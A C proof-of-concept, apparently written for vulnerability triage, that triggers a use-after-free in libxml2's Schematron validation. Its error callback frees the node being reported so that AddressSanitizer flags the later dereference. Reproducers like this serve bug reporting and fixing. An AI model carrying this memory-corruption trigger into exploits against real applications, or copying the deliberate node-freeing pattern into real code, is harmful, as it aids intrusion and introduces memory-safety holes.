#include <stdio.h>
#include <string.h>
#include <libxml/parser.h>
#include <libxml/tree.h>
#include <libxml/schematron.h>
#include <libxml/xmlerror.h>

// Structured error callback: free the node referenced by the error.
static void uaf_structured_error(void *userData, xmlErrorPtr err) {
    static int freed_once = 0;
    if (freed_once)
        return;
    if (err && err->node) {
        xmlNodePtr node = (xmlNodePtr) err->node;
        // Invalidate the current node while xmlSchematronReportSuccess is still on the stack.
        // This will cause a use-after-free when it later dereferences cur->name at line 1625.
        xmlFreeNode(node);
        freed_once = 1;
    }
}

int main(void) {
    // Initialize libxml2
    xmlInitParser();

    // Minimal XML document; any element will do since our Schematron assert always fails
    const char *xmlStr = "<root><child/></root>";
    xmlDocPtr doc = xmlReadMemory(xmlStr, (int)strlen(xmlStr), "doc.xml", NULL, 0);
    if (doc == NULL) {
        fprintf(stderr, "Failed to parse XML document\n");
        return 1;
    }

    // Schematron schema which always fails on the context node (root)
    const char *schStr =
        "<schema xmlns='http://purl.oclc.org/dsdl/schematron'>"
        "  <pattern>"
        "    <rule context='root'>"
        "      <assert test='false()'>This should fail</assert>"
        "    </rule>"
        "  </pattern>"
        "</schema>";

    xmlDocPtr sdoc = xmlReadMemory(schStr, (int)strlen(schStr), "schema.sch", NULL, 0);
    if (sdoc == NULL) {
        fprintf(stderr, "Failed to parse Schematron schema\n");
        return 1;
    }

    xmlSchematronParserCtxtPtr spctxt = xmlSchematronNewDocParserCtxt(sdoc, NULL);
    if (spctxt == NULL) {
        fprintf(stderr, "Failed to create Schematron parser context\n");
        return 1;
    }

    xmlSchematronPtr schema = xmlSchematronParse(spctxt);
    if (schema == NULL) {
        fprintf(stderr, "Failed to parse Schematron\n");
        return 1;
    }

    // Create validation context with XML_SCHEMATRON_OUT_ERROR to force xmlRaiseError path
    xmlSchematronValidCtxtPtr vctxt = xmlSchematronNewValidCtxt(schema, XML_SCHEMATRON_OUT_ERROR);
    if (vctxt == NULL) {
        fprintf(stderr, "Failed to create Schematron valid context\n");
        return 1;
    }

    // Install structured error callback which frees the current node
    xmlSchematronSetValidStructuredErrors(vctxt, uaf_structured_error, NULL);

    // Trigger validation; the assert will fail, xmlSchematronReportSuccess will be called,
    // which calls xmlRaiseError; our callback frees the current node, then the function
    // dereferences cur->name and ASan should report a use-after-free.
    (void)xmlSchematronValidateDoc(vctxt, doc);

    // Cleanup. Intentionally do NOT free 'doc' to avoid double-free after our manual node free.
    xmlSchematronFreeValidCtxt(vctxt);
    xmlSchematronFree(schema);
    xmlSchematronFreeParserCtxt(spctxt);
    xmlFreeDoc(sdoc);

    xmlCleanupParser();
    return 0;
}
